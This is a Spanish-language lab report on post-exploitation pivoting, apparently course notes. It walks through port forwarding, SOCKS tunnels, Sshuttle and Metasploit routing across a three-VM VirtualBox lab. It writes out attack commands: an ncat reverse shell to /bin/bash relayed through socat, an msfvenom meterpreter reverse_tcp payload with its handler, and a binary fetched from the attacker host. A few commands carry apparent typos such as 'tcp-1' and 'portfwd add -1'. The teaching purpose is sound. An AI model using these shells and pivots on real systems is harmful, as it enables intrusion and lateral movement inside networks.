Documentos de Referencia: "AS-I - Post-Explotación_Pivoting.pdf"

# Informe Técnico: Pivoting en Ciberseguridad

## 1. Resumen Ejecutivo
Este informe técnico detalla el concepto de **pivoting** en el ámbito de la ciberseguridad y las metodologías para llevarlo a cabo. Se explora cómo un sistema comprometido puede ser utilizado como punto de apoyo para acceder a otras áreas de una red interna que de otro modo serían inaccesibles. El documento examina técnicas como el **tunneling**, **proxying** y **port forwarding**, y presenta un entorno de laboratorio práctico para ilustrar estos procedimientos utilizando herramientas como **Chisel**, **SSH**, **Socat**, **Sshuttle**, **Proxychains** y **Metasploit**.

---

## 2. Conceptos Fundamentales

### ¿Qué es Pivoting?
El **pivoting** es una técnica empleada por pentester y hackers éticos para ampliar la superficie de ataque de una organización. Consiste en utilizar un sistema que ya ha sido comprometido para lanzar ataques o acceder a otros sistemas dentro de la misma red que no son directamente accesibles desde el exterior, a menudo debido a restricciones como firewalls o porque no están expuestos a internet. El objetivo es penetrar servicios internos de la organización, como servidores de usuarios o de clientes.

### Técnicas de Pivoting
* **Proxying**: Esta técnica implica el uso de un servidor intermediario que actúa en nombre de un cliente para acceder a recursos. El atacante envía una solicitud a la máquina comprometida (el proxy), que la reenvía al destino. La respuesta del destino es devuelta al proxy y luego redirigida al atacante. Este método proporciona anonimato, filtrado de contenido y control de acceso, y se asemeja a la funcionalidad del NAT (Network Address Translation) de un router.
* **Tunneling**: Consiste en encapsular un protocolo de red dentro de otro para una transmisión de datos segura. Por ejemplo, el tráfico se puede encapsular dentro de una comunicación SSH o HTTP. La finalidad es atravesar redes que podrían bloquear o filtrar el tráfico normal.
* **Port Forwarding**: También conocido como reenvío de puertos, esta técnica redirige el tráfico de un puerto específico de un sistema a otro puerto de otro sistema dentro de la misma red. Permite crear una conexión entre un puerto local y un único puerto de un host objetivo a través de un host comprometido. El port forwarding suele ser más rápido y confiable que el proxying, pero su limitación es que solo permite el acceso a un solo puerto o a un rango muy pequeño en un dispositivo objetivo.

### Diferencias Clave
Aunque el proxying y el tunneling son similares, tienen diferencias importantes. En el **proxying**, la conexión del atacante se termina en el proxy, que luego actúa como un intermediario para la comunicación. En el **tunneling**, la conexión es directa y segura entre el atacante y el objetivo, atravesando la máquina pivote sin que el tráfico se termine en ella.

---

## 3. Procedimientos Prácticos

### Configuración del Laboratorio
El entorno de laboratorio está compuesto por tres máquinas virtuales en VirtualBox: una máquina **Kali**, una **Ubuntu 1** (M1, que actuará como pivote) y una **Ubuntu 2** (M2). Se configuran dos redes internas (`Net1` y `Net2`).
* **Kali (10.0.1.4)** se conecta a `Net1`.
* **M2 (10.0.2.5)** se conecta a `Net2`.
* **M1 (10.0.1.5 en Net1 y 10.0.2.4 en Net2)** tiene dos interfaces de red, lo que le permite actuar como pivote entre ambas redes.

Se levantan servidores web en cada máquina para facilitar la verificación del acceso, usando el comando `sudo python3 -m http.server 80`, que requiere permisos de administrador para usar el puerto 80.

### Local Port Forwarding con Chisel
Esta técnica configura el servidor **Chisel** en la máquina pivote (M1) y el cliente en la máquina del atacante (Kali).
1.  **Transferencia de Chisel:** Desde M1, se descarga el binario de Chisel de la máquina Kali usando `wget http://10.0.1.4/chisel`. Esto es posible porque Kali tiene un servidor web ejecutándose.
2.  **Ejecución del Servidor:** En M1, se otorgan permisos de ejecución con `chmod +x chisel` y se inicia el servidor con `sudo ./chisel server -p 1000`. El uso de `sudo` es necesario porque el puerto 1000 es un puerto reservado.
3.  **Ejecución del Cliente:** En Kali, se inicia el cliente de Chisel para conectarse al servidor en M1 y reenviar el tráfico del puerto 82 de Kali al puerto 80 de M2. El comando es `./chisel client 10.0.1.5:1000 82:10.0.2.5:80`. El puerto `82` se abre en Kali, y cualquier tráfico que llegue a él es reenviado a M2. La dirección `10.0.2.5` es resoluble por M1, que actúa como pivote.

### Local Port Forwarding con SSH
Esta técnica aprovecha el servicio SSH para el reenvío de puertos.
1.  **Configuración de SSH:** Se accede a la máquina como usuario `root` (`sudo su`) y se edita el archivo de configuración SSH (`/etc/sshd_config`) para permitir la autenticación con contraseña (`PasswordAuthentication yes`). El servicio SSH debe reiniciarse con `systemctl restart ssh`.
2.  **Creación del Túnel:** Desde Kali, se establece el túnel con un solo comando: `ssh -L 82:10.0.2.5:80 test@10.0.1.5`.
    * `ssh`: El comando principal.
    * `-L`: Indica que se va a realizar un reenvío de puerto local.
    * `82:10.0.2.5:80`: Redirige el tráfico del puerto local 82 al puerto 80 del host remoto 10.0.2.5, a través del túnel.
    * `test@10.0.1.5`: El usuario y la dirección del host al que se conecta SSH (la máquina pivote M1).
    * Para dejar la conexión en segundo plano y no bloquear la terminal, se pueden añadir los parámetros `-fNL`.

### Dynamic Port Forwarding
Esta técnica crea un túnel SOCKS, permitiendo redirigir todo el tráfico a través de un único puerto.
* **Con Chisel:** Se inicia el servidor Chisel en M1 con el parámetro `--socks5`: `sudo ./chisel server --socks5 -p 1000`. Luego, desde Kali, el cliente se conecta y abre un puerto SOCKS en el puerto 1080 local: `./chisel client 10.0.1.5:1000 1080:socks`. La conexión se utiliza con herramientas como **Proxychains** o extensiones de navegador como FoxyProxy.
* **Con SSH:** Se crea el túnel con un solo comando en Kali: `ssh -D 1080 test@10.0.1.5`. El parámetro `-D` indica el reenvío de puerto dinámico y el puerto 1080 es el puerto local de escucha para el túnel SOCKS.

### Pivoting con Socat y Sshuttle
* **Socat:** Es una herramienta multifuncional, descrita como "netcat con asteroides". Para crear un reenvío de puertos inverso (`reversal pivoting`), se pone a la escucha en Kali con `nc -lvnp 4444`. Desde M1, se inicia un servidor Socat que escuchará en el puerto 4455 y reenviará el tráfico al listener de Kali: `./socat tcp-1:4455,fork,reuseaddr tcp:10.0.1.4:4444`. Finalmente, desde M2, se envía una shell inversa a M1 con `ncat -e /bin/bash 10.0.2.4 4455`, logrando que la M2 se conecte a Kali.
* **Sshuttle:** Permite simular una VPN sobre una conexión SSH. Se instala con `sudo apt install sshuttle`. Para usarlo, se ejecuta `sshuttle -r test@10.0.1.5 10.0.2.0/24`. Esto redirige el tráfico de la red 10.0.2.0/24 a través de la máquina pivote M1, permitiendo a Kali acceder directamente a los hosts en la red interna. Una limitación de Sshuttle es que no redirige tráfico de capas inferiores, como ICMP (ping) o nmap, ya que opera en la capa TCP.

### Pivoting con Metasploit
Se utiliza Metasploit para obtener una sesión Meterpreter y pivotar.
1.  **Creación de Payload:** Desde Kali, se genera un payload `reverse.elf` con `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.1.4 LPORT=4444 -f elf -o reverse.elf`.
2.  **Descarga y Ejecución:** El payload se descarga en M1 (o M2 si tiene conectividad a Kali) y se ejecuta.
3.  **Configuración del Listener:** En Kali, se usa `msfconsole`, se configura el listener con `use exploit/multi/handler`, se establece el payload `linux/x64/meterpreter/reverse_tcp`, y se configura `LHOST` y `LPORT`. Al ejecutar `run`, se captura la sesión Meterpreter.
4.  **Enrutamiento de Red:** Una vez dentro de la sesión, se utiliza el comando `route` o el módulo `post/multi/manage/autoroute` para añadir la red 10.0.2.0/24, permitiendo a Metasploit interactuar con la red interna.
5.  **Reenvío de Puertos:** Se usa `portfwd` para redirigir un puerto local de Kali a un puerto en la máquina interna M2. El comando es `portfwd add -1 82 -p 80 -r 10.0.2.5`, lo que permite acceder al servidor web de M2 desde Kali a través de `localhost:82`.
6.  **Túnel SOCKS:** Se puede crear un túnel SOCKS con el módulo `auxiliary/server/socks_proxy`. Esto permite usar herramientas como `proxychains` para redirigir todo el tráfico a través de la sesión de Meterpreter.

---

## 4. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad
El pivoting es una habilidad fundamental en la post-explotación. Permite a los atacantes, y a los profesionales de la ciberseguridad, simular un escenario de ataque en una red real. Las técnicas de pivoting demuestran que, al comprometer una máquina, se puede obtener acceso a toda una red interna, resaltando la necesidad de segmentación de red y la implementación de múltiples capas de seguridad.

### Puntos de Aprendizaje Clave
* **Pivoting como Expansión de Ataque:** Un sistema comprometido se convierte en un trampolín para explotar otros hosts.
* **Tipos de Pivoting:** El **port forwarding** redirige puertos específicos, el **tunneling** encapsula tráfico para atravesar filtros, y el **proxying** usa un intermediario para el anonimato.
* **Herramientas Versátiles:** Herramientas como Chisel, SSH, Socat y Metasploit ofrecen múltiples opciones para realizar estas técnicas.
* **Limitaciones de la Capa de Transporte:** Los túneles SOCKS (capa de transporte) no pueden redirigir protocolos de capa de red como ICMP, lo que limita el uso de herramientas como ping o ciertos escaneos de Nmap.
* **Direcciones IP:** Es crucial diferenciar entre una dirección de loopback (`127.0.0.1`), que siempre se refiere a la máquina local, y una dirección de red privada (`10.0.1.5`), que identifica a un host específico dentro de una LAN.

### Relevancia Técnica
Dominar las técnicas de pivoting es esencial para los profesionales de la ciberseguridad que realizan pentesting, ya que les permite evaluar la seguridad de una red interna desde la perspectiva de un atacante. La capacidad de configurar túneles, reenviar puertos y utilizar herramientas como Proxychains para redirigir el tráfico es vital para simular ataques y descubrir vulnerabilidades en redes complejas. La comprensión de las limitaciones de los diferentes tipos de túneles (por ejemplo, por qué un túnel SOCKS no reenvía tráfico ICMP) es fundamental para la correcta ejecución de los procedimientos de seguridad y el análisis de la red.